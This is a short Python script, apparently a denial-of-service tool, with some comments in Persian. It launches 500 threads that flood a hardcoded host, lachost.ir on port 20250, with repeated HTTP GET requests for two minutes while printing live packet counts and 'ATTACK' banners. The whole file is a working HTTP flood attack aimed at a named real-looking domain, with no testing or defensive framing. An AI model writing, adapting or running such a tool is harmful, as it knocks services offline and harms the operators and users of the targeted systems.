#!/usr/bin/env python3
import threading
import socket
import time
import random
import sys


class ImprovedDDoSTool:
    def __init__(self):
        self.attack_running = False
        self.packets_sent = 0

    def http_attack(self, target, port):
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))

                # ارسال چندین درخواست در هر اتصال
                for _ in range(5):
                    http_get = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"
                    sock.send(http_get.encode())
                    self.packets_sent += 1
                    time.sleep(0.01)

                sock.close()
            except:
                pass

    def start_attack(self, target, port, threads, duration):
        self.attack_running = True
        self.packets_sent = 0

        print(f"🎯 Targeting: {target}:{port}")
        print(f"⚡ Threads: {threads} | Duration: {duration}s")
        print("🚀 INITIATING ATTACK...\n")

        # راه‌اندازی threadها
        for i in range(threads):
            t = threading.Thread(target=self.http_attack, args=(target, port))
            t.daemon = True
            t.start()

        # نمایش آمار live
        start_time = time.time()
        while time.time() - start_time < duration and self.attack_running:
            elapsed = time.time() - start_time
            print(
                f"📊 Packets Sent: {self.packets_sent} | Elapsed: {elapsed:.1f}s", end='\r')
            time.sleep(1)

        self.attack_running = False
        print(f"\n✅ Attack completed! Total packets: {self.packets_sent}")


if __name__ == "__main__":
    tool = ImprovedDDoSTool()

    try:
        tool.start_attack(
            target="lachost.ir",
            port=20250,
            threads=500,
            duration=120
        )
    except KeyboardInterrupt:
        print("\n⚠️ User interrupted attack!")
